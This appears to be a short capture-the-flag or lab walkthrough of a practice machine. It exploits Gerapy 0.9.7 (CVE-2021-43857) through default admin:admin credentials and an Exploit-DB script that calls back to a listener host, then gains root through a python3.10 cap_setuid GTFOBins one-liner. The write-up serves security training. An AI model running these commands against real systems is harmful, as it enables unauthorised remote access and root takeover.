#box

*Created: 1/11/2026*

### Step 1

**Tags:** #RCE #Gerapy #Weak-Credentials

🔗 **URL/Link:** https://www.exploit-db.com/exploits/50640

**Command:**
```bash
python3 50640.py -t 192.168.200.24 -p 8000 -L 192.168.45.213 -P 8000
```

*Port: 8000*

> 
> On port 8000 we discover an authentication login called Gerapy. With basic credentials such as admin:admin we successfully authenticate. Its version is version 0.9.7 and it's vulnerable to a RCE called [CVE-2021-43857](https://www.exploit-db.com/exploits/50640). The script does not create a project inside the application, which is required, so we must first create one by clicking on Projects -> Create once authenticated

---

### Step 2

**Tags:** #GTFOBins #Linux #sudo-Capabilities #binaries

🔗 **URL/Link:** https://gtfobins.github.io/gtfobins/python/#capabilities

**Command:**
```bash
python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

> 
> To escalate we can leverage the Capabilities assigned to the `python3.10` binary. According to this [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) it's possible to escalate by leverage the capability `cap_setuid=ep` assigned to the python library.

---

